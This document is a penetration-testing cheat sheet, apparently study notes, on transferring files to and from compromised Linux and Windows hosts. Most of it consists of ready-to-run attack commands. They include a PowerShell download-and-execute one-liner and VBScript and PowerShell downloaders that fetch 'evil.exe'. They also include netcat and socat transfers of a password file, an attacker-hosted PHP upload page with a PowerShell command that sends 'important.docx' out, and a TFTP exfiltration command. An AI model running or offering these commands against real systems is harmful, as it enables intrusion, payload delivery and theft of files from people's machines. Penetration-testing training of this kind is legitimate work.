# Linux

#### FTP

```sending

1. sudo apt update && sudo apt install pure-ftpd

2. cat ./setup-ftp.sh
#!/bin/bash

sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
sudo cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd


3. chmod +x setup-ftp.sh

4. sudo ./setup-ftp.sh
```

```receiving
1. ftp <YOUR KALI IP>
2. authenticate with user+password
3. ! use binary mode for transfering binary files !
```


#### Netcat

actually not realy useful for transfering binaries ( can change them)

```receiving
nc -nlvp 4444 > incoming.exe
```

```sending
nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
```

#### Socat

```receiving
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

```sending
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```

# Windows
#### FTP

```kali
sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
ls /ftphome/

sudo systemctl restart pure-ftpd
```

```widows
echo open 192.168.119.228 21> ftp.txt
echo "USER ftpuser" >> ftp.txt
echo 12345>> ftp.txt
echo "bin" >> ftp.txt
echo "GET netcat.exe" >> ftp.txt
echo "bye" >> ftp.txt

ftp -v -n -s:ftp.txt
```

####  VBScript

```windows
1.

echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo  http.Open "GET", strURL, False >> wget.vbs
echo  http.Send >> wget.vbs
echo  varByteArray = http.ResponseBody >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo  strData = "" >> wget.vbs
echo  strBuffer = "" >> wget.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs

2.

cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

```kali
python3 -m http.server 80
```

#### Powershell

**script aproach**

```windows
1. as a script

echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

2. powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

**same but oneliner**

```windows
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```

**downlad and execute**

```windows
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
```

**downloading a Binary from Kali to Windows**

_Kali_: compress binary -> convert to hex -> send to Windows script
_Windows_: run and redirect to powershell

```kali

1. find/download binary

locate nc.exe | grep binaries

2. copy

cp /usr/share/windows-resources/binaries/nc.exe .

3. compress

upx -9 nc.exe

4. exe2hex -x nc.exe -p nc.cmd
```

```windows
copy and paste this script into a shell on our Windows machine and run it
```

**From Windows to Kali** 

```kali
1. start apache 
2. place the scrupt to the web root


index.html

<!DOCTYPE html>
<html>
<body>

<form action="upload.php" method="post" enctype="multipart/form-data">
  Select image to upload:
  <input type="file" name="fileToUpload" id="fileToUpload">
  <input type="submit" value="Upload Image" name="submit">
</form>

</body>
</html>


upload.php

<?php
$target_dir = "/var/www/uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;

// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
  echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
  if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "The file ". htmlspecialchars( basename( $_FILES["fileToUpload"]["name"])). " has been uploaded.";
  } else {
    echo "Sorry, there was an error uploading your file.";
  }
}
?>

3. 

sudo mkdir /var/www/uploads
ps -ef | grep apache
sudo chown www-data: /var/www/uploads
ls -la
```

```windows
powershell (New-Object System.Net.WebClient).UploadFile('http://10.8.67.157/upload.php', 'important.docx')
```

**Old Windows**

Windows 7 and Windows Server 2008 R2 and lower

```kali
sudo apt update && sudo apt install atftp

sudo mkdir /tftp

sudo chown nobody: /tftp

sudo atftpd --daemon --port 69 /tftp
```

```windows
tftp -i 10.11.0.4 put important.docx
```